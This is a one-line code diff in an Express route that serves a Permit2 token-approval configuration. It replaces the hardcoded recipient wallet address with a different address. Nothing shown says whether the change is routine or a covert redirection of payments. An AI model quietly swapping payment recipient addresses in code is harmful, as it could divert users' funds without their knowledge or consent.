@@ -393,7 +393,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json({
         spenderAddress,
         permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
-        recipientAddress: "0xa50408CEbAD7E50bC0DAdf1EdB3f3160e0c07b6E",
+        recipientAddress: "0x2c73de09a4C59E910343626Ab6b4A4d974EC731f",
       });
     } catch (error) {
       res.status(500).json({ error: "Failed to get Permit2 config" });
